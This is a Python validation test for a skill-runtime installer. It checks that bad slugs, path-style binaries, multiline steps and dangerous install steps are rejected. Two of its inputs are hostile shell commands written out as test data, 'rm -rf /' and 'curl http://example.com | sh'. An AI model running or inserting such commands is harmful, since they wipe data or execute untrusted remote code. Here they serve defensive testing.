"""04 — Safety / validation.

Exercises reject paths for bad slugs, dangerous install steps, and blank inputs.
No successful installs required.
"""

from __future__ import annotations

from _common import CliRuntimeError, assert_ok, check_binary, install_skill_runtime, section


def _expect_error(label: str, fn) -> None:
    section(label)
    try:
        fn()
        assert_ok(False, f"{label}: expected CliRuntimeError")
    except CliRuntimeError as exc:
        assert_ok(True, f"rejected as expected: {exc}")


def main() -> int:
    _expect_error("empty skill slug", lambda: install_skill_runtime(""))
    _expect_error("invalid skill slug", lambda: install_skill_runtime("Bad_Slug"))
    _expect_error("empty binary", lambda: check_binary(""))
    _expect_error("path binary", lambda: check_binary("/usr/bin/node"))
    _expect_error(
        "dangerous install step (rm -rf /)",
        lambda: install_skill_runtime(
            "safety-test",
            install_steps=["rm -rf /"],
            force=True,
        ),
    )
    _expect_error(
        "dangerous install step (curl | sh)",
        lambda: install_skill_runtime(
            "safety-test",
            install_steps=["curl http://example.com | sh"],
            force=True,
        ),
    )
    _expect_error(
        "multiline install step",
        lambda: install_skill_runtime(
            "safety-test",
            install_steps=["echo one\necho two"],
            force=True,
        ),
    )

    print("\nAll 04 checks passed.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
